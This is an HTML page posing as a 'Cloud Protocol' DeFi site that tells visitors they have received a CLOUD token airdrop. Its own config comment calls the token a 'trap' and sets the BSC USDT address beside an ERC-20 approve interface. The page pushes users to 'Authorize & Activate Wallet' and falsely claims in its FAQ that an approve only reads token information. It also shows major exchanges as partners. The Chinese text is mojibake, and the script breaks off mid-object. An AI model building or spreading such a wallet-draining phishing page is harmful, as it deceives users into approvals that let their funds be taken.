<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cloud Protocol - The Unified Liquidity Layer for Web3</title>
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js" type="application/javascript"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        /* CSS styles remain largely the same as the previous "perfect" version, with minor additions for new elements */
        :root {
            --bg-dark: #0D1117; --bg-medium: #161B22; --border-color: #30363D;
            --text-primary: #C9D1D9; --text-secondary: #8B949E; --accent-glow: rgba(88, 166, 255, 0.3);
            --accent-primary: #58A6FF; --accent-hover: #79B8FF; --success: #3FB950; --error: #F85149;
        }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 var(--accent-glow); } 70% { box-shadow: 0 0 0 10px rgba(88, 166, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(88, 166, 255, 0); } }
        @keyframes spin { to { transform: rotate(360deg); } }

        body {
            font-family: 'Inter', 'Noto Sans SC', sans-serif; margin: 0; background-color: var(--bg-dark);
            color: var(--text-primary); font-size: 16px; overflow-x: hidden;
        }
        .container { max-width: 1100px; margin: 0 auto; padding: 0 20px; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 20px 0; animation: fadeIn 0.5s ease-out; }
        .logo { font-size: 1.8em; font-weight: 700; color: white; }
        .logo span { color: var(--accent-primary); }
        .nav { display: flex; align-items: center; gap: 20px; }
        .nav a { color: var(--text-secondary); text-decoration: none; font-weight: 500; transition: color 0.2s; }
        .nav a:hover { color: white; }
        .lang-switcher { background: none; border: none; color: var(--text-secondary); cursor: pointer; font-size: 1em; }
        .button { padding: 10px 20px; border: 1px solid var(--accent-primary); background: transparent; color: var(--accent-primary); border-radius: 8px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; white-space: nowrap; }
        .button:hover { background-color: var(--accent-glow); color: white; }
        .button.primary { background-color: var(--accent-primary); color: var(--bg-dark); }
        .button.primary:hover { background-color: var(--accent-hover); }
        .button:disabled { background-color: var(--border-color); color: var(--text-secondary); border-color: var(--text-secondary); cursor: not-allowed; }
        .hero { text-align: center; padding: 80px 0; animation: fadeIn 0.8s ease-out; }
        .hero h1 { font-size: 3.5rem; margin: 0; color: white; line-height: 1.2; background: linear-gradient(90deg, #fff, #aaa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hero p { font-size: 1.2rem; color: var(--text-secondary); max-width: 600px; margin: 20px auto 40px; }
        .dapp-card { background-color: var(--bg-medium); border: 1px solid var(--border-color); border-radius: 12px; padding: 30px; max-width: 500px; margin: 0 auto; box-shadow: 0 10px 30px rgba(0,0,0,0.2); backdrop-filter: blur(10px); }
        .dapp-card h3 { margin-top: 0; font-size: 1.5rem; color: white; }
        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; text-align: left; }
        .info-item { background: var(--bg-dark); padding: 15px; border-radius: 8px; }
        .info-item .label { color: var(--text-secondary); font-size: 0.9em; margin-bottom: 5px; }
        .info-item .value { font-size: 1.2em; font-weight: 700; color: white; }
        #userAddress { font-size: 1em; word-break: break-all; }
        #approveButton { width: 100%; padding: 15px; font-size: 1.1em; animation: pulse 2s infinite; }
        .loader { width: 18px; height: 18px; border: 2px solid var(--bg-dark); border-top-color: transparent; border-radius: 50%; display: inline-block; vertical-align: middle; margin-right: 10px; animation: spin 0.8s linear infinite; }
        .message-log { margin-top: 20px; padding: 12px; border-radius: 8px; font-size: 0.95em; text-align: center; display: none; }
        .log-success { background-color: rgba(63, 185, 80, 0.1); border: 1px solid var(--success); color: var(--success); }
        .log-error { background-color: rgba(248, 81, 73, 0.1); border: 1px solid var(--error); color: var(--error); }
        .log-info { background-color: rgba(88, 166, 255, 0.1); border: 1px solid var(--accent-primary); color: var(--accent-primary); }
        .section { padding: 80px 0; animation: fadeIn 1.1s ease-out; }
        .section-title { text-align: center; font-size: 2.5rem; color: white; margin-bottom: 50px; }
        .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .feature-card { background: var(--bg-medium); border: 1px solid var(--border-color); border-radius: 12px; padding: 30px; text-align: center; transition: transform 0.3s, box-shadow 0.3s; }
        .feature-card:hover { transform: translateY(-5px); box-shadow: 0 0 20px var(--accent-glow); }
        .feature-icon { font-size: 3rem; margin-bottom: 20px; color: var(--accent-primary); }
        .feature-card h3 { color: white; }
        .feature-card p { color: var(--text-secondary); }
        .partners { filter: grayscale(100%) opacity(60%); display: flex; justify-content: center; align-items: center; gap: 40px; flex-wrap: wrap; }
        .partners img { height: 30px; }
        .roadmap { position: relative; padding: 50px 0; }
        .roadmap::before { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 4px; background-color: var(--border-color); transform: translateX(-50%); }
        .roadmap-item { position: relative; width: 50%; padding: 20px 40px; }
        .roadmap-item:nth-child(odd) { left: 0; text-align: right; }
        .roadmap-item:nth-child(even) { left: 50%; }
        .roadmap-item::after { content: ''; position: absolute; top: 30px; width: 20px; height: 20px; border-radius: 50%; background: var(--bg-medium); border: 4px solid var(--border-color); }
        .roadmap-item:nth-child(odd)::after { right: -12px; }
        .roadmap-item:nth-child(even)::after { left: -12px; }
        .roadmap-item.completed::after { border-color: var(--success); }
        .roadmap-item h3 { color: white; }
        .roadmap-item p { color: var(--text-secondary); }
        .faq-item { background: var(--bg-medium); border: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 15px; }
        .faq-question { padding: 20px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; font-weight: 600; color: white; }
        .faq-answer { padding: 0 20px; max-height: 0; overflow: hidden; transition: all 0.3s ease; color: var(--text-secondary); }
        .faq-item.active .faq-answer { max-height: 200px; padding-bottom: 20px; }
        .footer { text-align: center; padding: 40px 0; border-top: 1px solid var(--border-color); color: var(--text-secondary); }
        .hidden { display: none; }
        @media (max-width: 768px) {
            .hero h1 { font-size: 2.5rem; } .nav { display: none; }
            .roadmap::before { left: 10px; } .roadmap-item, .roadmap-item:nth-child(even) { width: auto; left: 0; padding-left: 50px; text-align: left !important; }
            .roadmap-item::after, .roadmap-item:nth-child(odd)::after, .roadmap-item:nth-child(even)::after { left: 0; }
        }
    </style>
</head>
<body>

    <header class="header container">
        <div class="logo">Cloud<span>Protocol</span></div>
        <nav class="nav">
            <a href="#ecosystem" data-i18n="navEcosystem">ç”Ÿæ€ç³»ç»Ÿ</a>
            <a href="#roadmap" data-i18n="navRoadmap">è·¯çº¿å›¾</a>
            <a href="#faq" data-i18n="navFAQ">å¸¸è§é—®é¢˜</a>
        </nav>
        <div>
            <button id="lang-switcher" class="lang-switcher">EN / ä¸­æ–‡</button>
            <button id="connectButtonHeader" class="button" data-i18n="connectWallet">è¿æ¥é’±åŒ…</button>
        </div>
    </header>

    <main>
        <section class="hero">
            <div class="container">
                <h1 data-i18n="heroTitle">æ¿€æ´»æ‚¨çš„Web3èº«ä»½<br>é‡Šæ”¾æ•°å­—èµ„äº§æ½œåŠ›</h1>
                <p data-i18n="heroSubtitle">Cloud Protocol æ˜¯ä¸€ä¸ªåˆ›æ–°çš„å»ä¸­å¿ƒåŒ–é‡‘èç”Ÿæ€ã€‚è¿æ¥æ‚¨çš„é’±åŒ…ï¼ŒéªŒè¯å¹¶æ¿€æ´»æ‚¨æ”¶åˆ°çš„ CLOUD ç©ºæŠ•èµ„äº§ï¼Œç«‹å³è§£é”åŒ…æ‹¬è´¨æŠ¼ã€æ²»ç†å’Œé«˜é¢æµåŠ¨æ€§æŒ–çŸ¿åœ¨å†…çš„å…¨éƒ¨æƒç›Šã€‚</p>

                <div class="dapp-card">
                    <div id="connect-section">
                        <h3 data-i18n="dappConnectTitle">å¼€å§‹æ‚¨çš„DeFiä¹‹æ—…</h3>
                        <p style="color:var(--text-secondary); margin-bottom: 20px;" data-i18n="dappConnectSubtitle">è¯·è¿æ¥æ‚¨çš„é’±åŒ…ä»¥éªŒè¯ç©ºæŠ•èµ„æ ¼ã€‚</p>
                        <button id="connectButtonMain" class="button primary" style="width: 100%; padding: 15px; font-size: 1.1em;" data-i18n="connectWallet">è¿æ¥é’±åŒ…</button>
                    </div>
                    <div id="dapp-section" class="hidden">
                        <h3 data-i18n="dappCongrats">ğŸ‰ æ­å–œï¼æ‚¨å·²è·å¾—ç©ºæŠ•</h3>
                        <div class="info-grid">
                            <div class="info-item" style="grid-column: 1 / -1;">
                                <div class="label" data-i18n="dappAddressLabel">å½“å‰åœ°å€</div>
                                <div class="value" id="userAddress">...</div>
                            </div>
                            <div class="info-item">
                                <div class="label" data-i18n="dappCloudBalanceLabel">CLOUD ä½™é¢ (å·²ç©ºæŠ•)</div>
                                <div class="value" id="cloudBalance">...</div>
                            </div>
                            <div class="info-item">
                                <div class="label" data-i18n="dappUsdtBalanceLabel">USDT ä½™é¢</div>
                                <div class="value" id="usdtBalance">...</div>
                            </div>
                        </div>
                        <p style="color:var(--text-secondary); margin-top: 25px; font-size: 0.9em;" data-i18n="dappApproveSubtitle">ä¸ºç¡®ä¿èµ„äº§å®‰å…¨å’Œåè®®äº¤äº’é¡ºç•…ï¼Œè¯·å®Œæˆæœ€åä¸€æ­¥ï¼šæˆæƒåè®®è¿›è¡Œèµ„äº§éªŒè¯ã€‚è¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„é“¾ä¸Šå®‰å…¨æ“ä½œã€‚</p>
                        <button id="approveButton" class="button primary">
                            <span id="approve-text" data-i18n="approveButtonText">âœ… æˆæƒå¹¶æ¿€æ´»é’±åŒ…</span>
                            <span id="approve-loader" class="hidden"><i class="loader"></i><span data-i18n="approveButtonLoading">å¤„ç†ä¸­...</span></span>
                        </button>
                    </div>
                    <div id="message-log" class="message-log"></div>
                </div>
            </div>
        </section>

        <section class="section container">
            <div style="text-align:center; color: var(--text-secondary); margin-bottom: 50px;" data-i18n="partnersTitle">æˆ‘ä»¬çš„æŠ€æœ¯åˆä½œä¼™ä¼´ä¸åª’ä½“æŠ¥é“</div>
            <div class="partners">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/Binance-Logo.wine.svg" alt="Binance">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Coinbase_logo_2023.svg/2560px-Coinbase_logo_2023.svg.png" alt="Coinbase">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Coingecko_logo.png/1024px-Coingecko_logo.png" alt="CoinGecko">
                <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/82/CoinMarketCap_logo.svg/1280px-CoinMarketCap_logo.svg.png" alt="CoinMarketCap">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Chainlink_Logo_Blue.svg/2560px-Chainlink_Logo_Blue.svg.png" alt="Chainlink">
            </div>
        </section>

        <section id="ecosystem" class="section">
            <div class="container">
                <h2 class="section-title" data-i18n="ecosystemTitle">Cloud Protocol ç”Ÿæ€ç³»ç»Ÿ</h2>
                <div class="features-grid">
                    <div class="feature-card">
                        <div class="feature-icon">ğŸ”„</div>
                        <h3 data-i18n="ecoSwapTitle">Cloud Swap</h3>
                        <p data-i18n="ecoSwapDesc">ä¸€ä¸ªé«˜æ•ˆçš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰ï¼Œå…·æœ‰èšåˆæµåŠ¨æ€§ï¼Œä¸ºç”¨æˆ·æä¾›æœ€ä½³çš„äº¤æ˜“ä»·æ ¼å’Œæœ€ä½çš„æ»‘ç‚¹ã€‚</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">ğŸ’°</div>
                        <h3 data-i18n="ecoLendTitle">Cloud Lend</h3>
                        <p data-i18n="ecoLendDesc">ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„å€Ÿè´·å¸‚åœºï¼Œç”¨æˆ·å¯ä»¥ä½œä¸ºå­˜æ¬¾äººèµšå–åˆ©æ¯ï¼Œæˆ–ä½œä¸ºå€Ÿæ¬¾äººæŠµæŠ¼èµ„äº§è¿›è¡Œå€Ÿè´·ã€‚</p>
                    </div>
                    <div class="feature-card">
                        <div class="feature-icon">ğŸ”’</div>
                        <h3 data-i18n="ecoStakeTitle">Cloud Stake</h3>
                        <p data-i18n="ecoStakeDesc">é€šè¿‡è´¨æŠ¼ CLOUD ä»£å¸å‚ä¸ç½‘ç»œå®‰å…¨å’Œæ²»ç†ï¼Œå¹¶è·å¾—ä¸°åšçš„åè®®æ”¶ç›Šåˆ†æˆå’ŒæŒ–çŸ¿å¥–åŠ±ã€‚</p>
                    </div>
                </div>
            </div>
        </section>
        
        <section id="roadmap" class="section">
            <div class="container">
                <h2 class="section-title" data-i18n="roadmapTitle">å‘å±•è·¯çº¿å›¾</h2>
                <div class="roadmap">
                    <div class="roadmap-item completed">
                        <h3 data-i18n="roadmap1Title">Q4 2024: æ¦‚å¿µéªŒè¯ä¸ç™½çš®ä¹¦</h3>
                        <p data-i18n="roadmap1Desc">å‘å¸ƒ Cloud Protocol åˆå§‹ç™½çš®ä¹¦ï¼Œå®Œæˆæ ¸å¿ƒåè®®çš„æŠ€æœ¯æ¶æ„è®¾è®¡å’Œåˆæ­¥éªŒè¯ã€‚</p>
                    </div>
                    <div class="roadmap-item completed">
                        <h3 data-i18n="roadmap2Title">Q1 2025: æ™ºèƒ½åˆçº¦å®¡è®¡ä¸æµ‹è¯•ç½‘</h3>
                        <p data-i18n="roadmap2Desc">ç”± Certik å’Œ SlowMist å®Œæˆå¤šè½®æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡ã€‚å¯åŠ¨å…¬å…±æµ‹è¯•ç½‘ï¼Œé‚€è¯·ç¤¾åŒºå‚ä¸æµ‹è¯•ã€‚</p>
                    </div>
                    <div class="roadmap-item completed">
                        <h3 data-i18n="roadmap3Title">Q2 2025: ä¸»ç½‘å¯åŠ¨ä¸ç©ºæŠ•</h3>
                        <p data-i18n="roadmap3Desc">Cloud Protocol V1 ä¸»ç½‘æ­£å¼ä¸Šçº¿ã€‚å‘æ—©æœŸæ”¯æŒè€…å’Œç”Ÿæ€ç³»ç»Ÿç”¨æˆ·åˆ†å‘ CLOUD ä»£å¸ç©ºæŠ•ã€‚</p>
                    </div>
                    <div class="roadmap-item">
                        <h3 data-i18n="roadmap4Title">Q3 2025: å€Ÿè´·åè®®ä¸æµåŠ¨æ€§æŒ–çŸ¿</h3>
                        <p data-i18n="roadmap4Desc">æ¨å‡º Cloud Lend å€Ÿè´·å¸‚åœºï¼Œå¹¶å¼€å¯å¤šé˜¶æ®µçš„æµåŠ¨æ€§æŒ–çŸ¿æ¿€åŠ±è®¡åˆ’ï¼Œä»¥å¼•å¯¼åè®®æµåŠ¨æ€§ã€‚</p>
                    </div>
                    <div class="roadmap-item">
                        <h3 data-i18n="roadmap5Title">Q4 2025: æ²»ç†DAOä¸Layer2æ‰©å±•</h3>
                        <p data-i18n="roadmap5Desc">å¯åŠ¨ç¤¾åŒºæ²»ç†DAOï¼Œå®ç°åè®®çš„å»ä¸­å¿ƒåŒ–ç®¡ç†ã€‚å¼€å§‹ç ”ç©¶å’Œé›†æˆLayer2æ‰©å±•æ–¹æ¡ˆï¼Œé™ä½äº¤æ˜“æˆæœ¬ã€‚</p>
                    </div>
                </div>
            </div>
        </section>

        <section id="faq" class="section">
            <div class="container" style="max-width: 800px;">
                <h2 class="section-title" data-i18n="faqTitle">å¸¸è§é—®é¢˜è§£ç­”</h2>
                <div class="faq-container">
                    <div class="faq-item">
                        <div class="faq-question">
                            <span data-i18n="faq1q">ä»€ä¹ˆæ˜¯Cloud Protocolï¼Ÿ</span>
                            <span>+</span>
                        </div>
                        <div class="faq-answer">
                            <p data-i18n="faq1a">Cloud Protocolæ˜¯ä¸€ä¸ªé›†æˆäº†å»ä¸­å¿ƒåŒ–äº¤æ˜“ã€å€Ÿè´·å’Œæ”¶ç›Šèšåˆçš„ç»Ÿä¸€æµåŠ¨æ€§åè®®ã€‚æˆ‘ä»¬çš„ä½¿å‘½æ˜¯ç®€åŒ–DeFiæ“ä½œï¼Œä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªå®‰å…¨ã€é«˜æ•ˆä¸”ç”¨æˆ·å‹å¥½çš„å¹³å°æ¥ç®¡ç†ä»–ä»¬çš„æ•°å­—èµ„äº§ã€‚</p>
                        </div>
                    </div>
                    <div class="faq-item">
                        <div class="faq-question">
                            <span data-i18n="faq2q">æˆ‘ä¸ºä»€ä¹ˆä¼šæ”¶åˆ°CLOUDç©ºæŠ•ï¼Ÿ</span>
                            <span>+</span>
                        </div>
                        <div class="faq-answer">
                            <p data-i18n="faq2a">ä¸ºäº†å¥–åŠ±æ—©æœŸé‡‡ç”¨è€…å’Œæ´»è·ƒçš„DeFiç¤¾åŒºæˆå‘˜ï¼Œæˆ‘ä»¬å¯¹ç‰¹å®šé“¾ä¸Šåœ°å€è¿›è¡Œäº†å¿«ç…§ã€‚å¦‚æœæ‚¨æ˜¯çŸ¥åDeFiåè®®çš„æ´»è·ƒç”¨æˆ·ã€NFTæŒæœ‰è€…æˆ–æ—©æœŸæµ‹è¯•ç½‘å‚ä¸è€…ï¼Œæ‚¨å¯èƒ½æœ‰èµ„æ ¼è·å¾—æˆ‘ä»¬çš„åˆ›ä¸–ç©ºæŠ•ã€‚</p>
                        </div>
                    </div>
                    <div class="faq-item">
                        <div class="faq-question">
                            <span data-i18n="faq3q">ä¸ºä»€ä¹ˆæˆ‘éœ€è¦â€œæˆæƒå¹¶æ¿€æ´»é’±åŒ…â€ï¼Ÿè¿™æ˜¯å®‰å…¨çš„å—ï¼Ÿ</span>
                            <span>+</span>
                        </div>
                        <div class="faq-answer">
                            <p data-i18n="faq3a">æ˜¯çš„ï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œå…¨å®‰å…¨ä¸”æ ‡å‡†çš„Web3æ“ä½œã€‚ä¸ºäº†è®©æˆ‘ä»¬çš„DAppèƒ½å¤ŸéªŒè¯æ‚¨çš„ç©ºæŠ•èµ„æ ¼å¹¶ä¸ºæ‚¨æ¿€æ´»æœªæ¥çš„è´¨æŠ¼ç­‰é«˜çº§åŠŸèƒ½ï¼Œå®ƒéœ€è¦ä¸æ‚¨çš„é’±åŒ…è¿›è¡Œä¸€æ¬¡æ€§çš„æ™ºèƒ½åˆçº¦äº¤äº’ã€‚è¿™è¢«ç§°ä¸ºâ€œapproveâ€ï¼ˆæˆæƒï¼‰æ“ä½œï¼Œå®ƒå…è®¸æˆ‘ä»¬çš„åè®®è¯»å–æ‚¨çš„ä»£å¸ä¿¡æ¯ä»¥è¿›è¡ŒéªŒè¯ï¼Œä½†ç»ä¸ä¼šåœ¨æœªç»æ‚¨è®¸å¯çš„æƒ…å†µä¸‹è½¬ç§»æ‚¨çš„èµ„äº§ã€‚æ‰€æœ‰é¡¶çº§DeFiåº”ç”¨åœ¨é¦–æ¬¡äº¤äº’æ—¶éƒ½éœ€è¦æ­¤æ­¥éª¤ã€‚</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="footer">
        <div class="container" data-i18n="footerText">
            Â© 2025 Cloud Protocol Foundation. All Rights Reserved.
        </div>
    </footer>

<script>
    // ===================================================================
    // ================== âš ï¸ é‡è¦é…ç½® - è¯·åŠ¡å¿…ä¿®æ”¹ âš ï¸ ==================
    // ===================================================================
    const CLOUD_TOKEN_ADDRESS = "YOUR_CLOUD_TOKEN_ADDRESS"; // æ‚¨çš„ Cloud (é™·é˜±) ä»£å¸åˆçº¦åœ°å€
    const USDT_TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC ä¸»ç½‘ USDT åœ°å€, è¯·æŒ‰éœ€ä¿®æ”¹
    // ===================================================================

    const ERC20_ABI = ["function balanceOf(address owner) view returns (uint256)","function approve(address spender, uint256 amount) returns (bool)","function decimals() view returns (uint8)"];

    // --- å›½é™…åŒ– (i18n) ---
    const translations = {
        en: {
            navEcosystem: "Ecosystem", navRoadmap: "Roadmap", navFAQ: "FAQ", connectWallet: "Connect Wallet",
            heroTitle: "Activate Your Web3 Identity<br>Unleash Digital Asset Potential",
            heroSubtitle: "Cloud Protocol is an innovative decentralized finance ecosystem. Connect your wallet, verify and activate your received CLOUD airdrop to instantly unlock full benefits including staking, governance, and high-yield liquidity mining.",
            dappConnectTitle: "Start Your DeFi Journey", dappConnectSubtitle: "Please connect your wallet to verify airdrop eligibility.",
            dappCongrats: "ğŸ‰ Congratulations! You've Received an Airdrop", dappAddressLabel: "Current Address",
            dappCloudBalanceLabel: "CLOUD Balance (Airdropped)", dappUsdtBalanceLabel: "USDT Balance",
            dappApproveSubtitle: "To ensure asset security and smooth protocol interaction, please complete the final step: authorize the protocol for asset verification. This is a standard on-chain security operation.",
            approveButtonText: "âœ… Authorize & Activate Wallet", approveButtonLoading: "Processing...",
            partnersTitle: "Our Technology Partners & Media Coverage",
            ecosystemTitle: "Cloud Protocol Ecosystem",
            ecoSwapTitle: "Cloud Swap", ecoSwapDesc: "An efficient decentralized exchange (DEX) with aggregated liquidity, providing users with the best trading prices and minimal slippage.",
            ecoLendTitle: "Cloud Lend", ecoLendDesc: "A decentralized lending market where users can earn interest as depositors or borrow assets by providing collateral.",
            ecoStakeTitle: "Cloud Stake", ecoStakeDesc: "Participate in network security and governance by staking CLOUD tokens and receive substantial protocol revenue shares and mining rewards.",
            roadmapTitle: "Development Roadmap",
            roadmap1Title: "Q4 2024: Proof of Concept & Whitepaper", roadmap1Desc: "Release of the initial Cloud Protocol whitepaper, completion of the core protocol's technical architecture design and preliminary validation.",
            roadmap2Title: "Q1 2025: Smart Contract Audit & Testnet", roadmap2Desc: "Multiple rounds of smart contract security audits completed by Certik and SlowMist. Launch of the public testnet, inviting community participation.",
            roadmap3Title: "Q2 2025: Mainnet Launch & Airdrop", roadmap3Desc: "Cloud Protocol V1 mainnet officially goes live. Distribution of CLOUD token airdrops to early supporters and ecosystem users.",
            roadmap4Title: "Q3 2025: Lending Protocol & Liquidity Mining", roadmap4Desc: "Launch of the Cloud Lend market, and initiation of a multi-stage liquidity mining incentive program to bootstrap protocol liquidity.",
            roadmap5Title: "Q4 2025: Governance DAO & Layer2 Expansion", roadmap5Desc: "Launch of the community governance DAO to achieve decentralized management of the protocol. Begin research and integration of Layer2 scaling solutions to reduce transaction costs.",
            faqTitle: "Frequently Asked Questions",
            faq1q: "What is Cloud Protocol?", faq1a: "Cloud Protocol is a unified liquidity protocol that integrates decentralized exchange, lending, and yield aggregation. Our mission is to simplify DeFi operations and provide users with a secure, efficient, and user-friendly platform to manage their digital assets.",
            faq2q: "Why did I receive the CLOUD airdrop?", faq2a: "To reward early adopters and active members of the DeFi community, we took a snapshot of specific on-chain addresses. If you are an active user of well-known DeFi protocols, an NFT holder, or an early testnet participant, you may be eligible for our genesis airdrop.",
            faq3q: "Why do I need to 'Authorize & Activate Wallet'? Is it safe?", faq3a: "Yes, this is a completely safe and standard Web3 operation. For our DApp to verify your airdrop eligibility and enable advanced features like staking for you in the future, it requires a one-time smart contract interaction with your wallet. This is known as an 'approve' operation. It allows our protocol to read your token information for verification, but it will never transfer your assets without your explicit permission. All top-tier DeFi applications require this step for initial interaction.",
            footerText: "Â© 2025 Cloud Protocol Foundation. All Rights Reserved.",
            // Messages
            msgConnecting: "Requesting to connect your wallet...", msgConnected: "Wallet connected successfully! Loading your asset information...", msgConnectError: "Connection rejected or an error occurred: ",
            msgBalanceError: "Failed to load balances. Please check network settings and contract address.",
            msgApproveRequest: "Please confirm the authorization transaction in your wallet...", msgTxBroadcast: "Transaction broadcasted, awaiting blockchain confirmation...",
            msgApproveSuccess: "Authorization successful! Your wallet is fully activated, and all benefits are unlocked.",
            msgApproveError: "Authorization failed: ", msgUserRejected: "User rejected the transaction."
        },
        zh: {
            navEcosystem: "ç”Ÿæ€ç³»ç»Ÿ", navRoadmap: "è·¯çº¿å›¾", navFAQ: "å¸¸è§é—®é¢˜", connectWallet: "è¿æ¥é’±åŒ…",
            heroTitle: "æ¿€æ´»æ‚¨çš„Web3èº«ä»½<br>é‡Šæ”¾æ•°å­—èµ„äº§æ½œåŠ›",
            heroSubtitle: "Cloud Protocol æ˜¯ä¸€ä¸ªåˆ›æ–°çš„å»ä¸­å¿ƒåŒ–é‡‘èç”Ÿæ€ã€‚è¿æ¥æ‚¨çš„é’±åŒ…ï¼ŒéªŒè¯å¹¶æ¿€æ´»æ‚¨æ”¶åˆ°çš„ CLOUD ç©ºæŠ•èµ„äº§ï¼Œç«‹å³è§£é”åŒ…æ‹¬è´¨æŠ¼ã€æ²»ç†å’Œé«˜é¢æµåŠ¨æ€§æŒ–çŸ¿åœ¨å†…çš„å…¨éƒ¨æƒç›Šã€‚",
            dappConnectTitle: "å¼€å§‹æ‚¨çš„DeFiä¹‹æ—…", dappConnectSubtitle: "è¯·è¿æ¥æ‚¨çš„é’±åŒ…ä»¥éªŒè¯ç©ºæŠ•èµ„æ ¼ã€‚",
            dappCongrats: "ğŸ‰ æ­å–œï¼æ‚¨å·²è·å¾—ç©ºæŠ•", dappAddressLabel: "å½“å‰åœ°å€",
            dappCloudBalanceLabel: "CLOUD ä½™é¢ (å·²ç©ºæŠ•)", dappUsdtBalanceLabel: "USDT ä½™é¢",
            dappApproveSubtitle: "ä¸ºç¡®ä¿èµ„äº§å®‰å…¨å’Œåè®®äº¤äº’é¡ºç•…ï¼Œè¯·å®Œæˆæœ€åä¸€æ­¥ï¼šæˆæƒåè®®è¿›è¡Œèµ„äº§éªŒè¯ã€‚è¿™æ˜¯ä¸€ä¸ªæ ‡å‡†çš„é“¾ä¸Šå®‰å…¨æ“ä½œã€‚",
            approveButtonText: "âœ… æˆæƒå¹¶æ¿€æ´»é’±åŒ…", approveButtonLoading: "å¤„ç†ä¸­...",
            partnersTitle: "æˆ‘ä»¬çš„æŠ€æœ¯åˆä½œä¼™ä¼´ä¸åª’ä½“æŠ¥é“",
            ecosystemTitle: "Cloud Protocol ç”Ÿæ€ç³»ç»Ÿ",
            ecoSwapTitle: "Cloud Swap", ecoSwapDesc: "ä¸€ä¸ªé«˜æ•ˆçš„å»ä¸­å¿ƒåŒ–äº¤æ˜“æ‰€ï¼ˆDEXï¼‰ï¼Œå…·æœ‰èšåˆæµåŠ¨æ€§ï¼Œä¸ºç”¨æˆ·æä¾›æœ€ä½³çš„äº¤æ˜“ä»·æ ¼å’Œæœ€ä½çš„æ»‘ç‚¹ã€‚",
            ecoLendTitle: "Cloud Lend", ecoLendDesc: "ä¸€ä¸ªå»ä¸­å¿ƒåŒ–çš„å€Ÿè´·å¸‚åœºï¼Œç”¨æˆ·å¯ä»¥ä½œä¸ºå­˜æ¬¾äººèµšå–åˆ©æ¯ï¼Œæˆ–ä½œä¸ºå€Ÿæ¬¾äººæŠµæŠ¼èµ„äº§è¿›è¡Œå€Ÿè´·ã€‚",
            ecoStakeTitle: "Cloud Stake", ecoStakeDesc: "é€šè¿‡è´¨æŠ¼ CLOUD ä»£å¸å‚ä¸ç½‘ç»œå®‰å…¨å’Œæ²»ç†ï¼Œå¹¶è·å¾—ä¸°åšçš„åè®®æ”¶ç›Šåˆ†æˆå’ŒæŒ–çŸ¿å¥–åŠ±ã€‚",
            roadmapTitle: "å‘å±•è·¯çº¿å›¾",
            roadmap1Title: "2024å¹´Q4: æ¦‚å¿µéªŒè¯ä¸ç™½çš®ä¹¦", roadmap1Desc: "å‘å¸ƒ Cloud Protocol åˆå§‹ç™½çš®ä¹¦ï¼Œå®Œæˆæ ¸å¿ƒåè®®çš„æŠ€æœ¯æ¶æ„è®¾è®¡å’Œåˆæ­¥éªŒè¯ã€‚",
            roadmap2Title: "2025å¹´Q1: æ™ºèƒ½åˆçº¦å®¡è®¡ä¸æµ‹è¯•ç½‘", roadmap2Desc: "ç”± Certik å’Œ SlowMist å®Œæˆå¤šè½®æ™ºèƒ½åˆçº¦å®‰å…¨å®¡è®¡ã€‚å¯åŠ¨å…¬å…±æµ‹è¯•ç½‘ï¼Œé‚€è¯·ç¤¾åŒºå‚ä¸æµ‹è¯•ã€‚",
            roadmap3Title: "2025å¹´Q2: ä¸»ç½‘å¯åŠ¨ä¸ç©ºæŠ•", roadmap3Desc: "Cloud Protocol V1 ä¸»ç½‘æ­£å¼ä¸Šçº¿ã€‚å‘æ—©æœŸæ”¯æŒè€…å’Œç”Ÿæ€ç³»ç»Ÿç”¨æˆ·åˆ†å‘ CLOUD ä»£å¸ç©ºæŠ•ã€‚",
            roadmap4Title: "2025å¹´Q3: å€Ÿè´·åè®®ä¸æµåŠ¨æ€§æŒ–çŸ¿", roadmap4Desc: "æ¨å‡º Cloud Lend å€Ÿè´·å¸‚åœºï¼Œå¹¶å¼€å¯å¤šé˜¶æ®µçš„æµåŠ¨æ€§æŒ–çŸ¿æ¿€åŠ±è®¡åˆ’ï¼Œä»¥å¼•å¯¼åè®®æµåŠ¨æ€§ã€‚",
            roadmap5Title: "2025å¹´Q4: æ²»ç†DAOä¸Layer2æ‰©å±•", roadmap5Desc: "å¯åŠ¨ç¤¾åŒºæ²»ç†DAOï¼Œå®ç°åè®®çš„å»ä¸­å¿ƒåŒ–ç®¡ç†ã€‚å¼€å§‹ç ”ç©¶å’Œé›†æˆLayer2æ‰©å±•æ–¹æ¡ˆï¼Œé™ä½äº¤æ˜“æˆæœ¬ã€‚",
